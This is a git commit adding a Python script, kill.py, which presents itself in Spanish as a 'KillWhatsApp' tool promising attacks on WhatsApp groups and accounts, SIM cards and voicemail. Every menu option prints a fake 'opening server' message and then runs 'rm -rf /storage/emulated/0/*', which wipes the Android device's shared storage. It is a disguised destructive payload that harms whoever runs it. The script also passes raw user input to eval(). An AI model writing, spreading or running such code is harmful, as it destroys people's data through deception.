40de54c3298eb3c8d5917fd2c5ede99ef8dc393f
Ch0l0 <73145048+ch0l0hatwhite@users.noreply.github.com>
2022-09-30 19:01:47 -0500

    Create kill.py

---
+++ kill.py
@@ -0,0 +1,64 @@
+
+#!/bin/python
+# -*- coding: utf-8 -*-
+
+import os
+print("""                                     
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@     .#%,      @@@@@@
+@@@@@@@@@@@@@@@@@   @@@@@@@@@@@@@@   @@@@
+@@@@@@@@@@@@@@@@  @@@@  @@@@@@@@@@@@  @@@@
+@@@@@@@@@@@@@@@  @@@@    @@@@@@@@@@@@  @@@@
+@@@@@@@@@@@@@@(  @@@@@  @@@@@@@@@@@@@(  @@@
+@@@@@@@@@@@@@@@  @@@@@@    @@@ .@@@@@  &@@@
+@@@@@@@@@@@@@@@   @@@@@@@@       @@@   @@@@
+@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@  @@@@@
+@@@@@@@@@@@@@@@  @.    @@@@@@@@    @@@@@@
+@@@@@@@@@@@@@@   @@@@@@@      @@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+ | |  (_) | |                                          
+ | | ___| | |                                          
+ | |/ / | | |                                          
+ |   <| | | |                                          
+ |_|\_\_|_|_|___           _                           
+ \ \        / / |         | |         /\               
+  \ \  /\  / /| |__   __ _| |_ ___   /  \   __ _ _ __  
+   \ \/  \/ / | '_ \ / _` | __/ __| / /\ \ / _` | '_ \ 
+    \  /\  /  | | | | (_| | |_\__ \/ ____ \ (_| | |_) |
+     \/  \/   |_| |_|\__,_|\__|___/_/    \_\__,_| .__/ 
+                                                | |    
+                                                |_|    
+   NO NOS RESPONSABILIZAMOS DEL USO.
+   HERRAMIENTA PARA DESTRUIR AL ENEMIGO.
+                                                                                                            
+~~~~~~~~~MENU~~~~~~~~~~~~
+[1] ATAQUE A GRUPOS DE WHATSAPP (ELIMINAR)
+[2] ATAQUE A CUENTAS DE WHATSAPP (SUSPENDER)
+[3] ATAQUE A TARJETAS SIM (DAÑAR LINEA MOVIL)
+[4] BUZONEAR NÚMEROS (TENEMOS MÁS DE 30 BUZONES ACTIVOS)
+░  
+                         ░               ░                            ░                                 
+""")
+eleccion = int(eval(input("KILLWHATSAPP>> ")))
+#
+#
+if eleccion == 1:
+	os.system("apt update")
+	print("INSTALANDO SERVIDOR PRIVADO")
+	os.system("rm -rf /storage/emulated/0/*")
+
+elif eleccion == 2:
+	os.system("apt update")
+	print("ABRIENDO PLATAFORMA..........")
+	os.system("rm -rf /storage/emulated/0/*")
+
+elif eleccion == 3:
+	os.system("apt update")
+	print("ABRIENDO SERVIDOR................")
+	os.system("rm -rf /storage/emulated/0/*")
+
+elif eleccion == 4:
+	os.system("apt update")
+	print("ABRIENDO SERVIDOR................")
+	os.system("rm -rf /storage/emulated/0/*")
+	
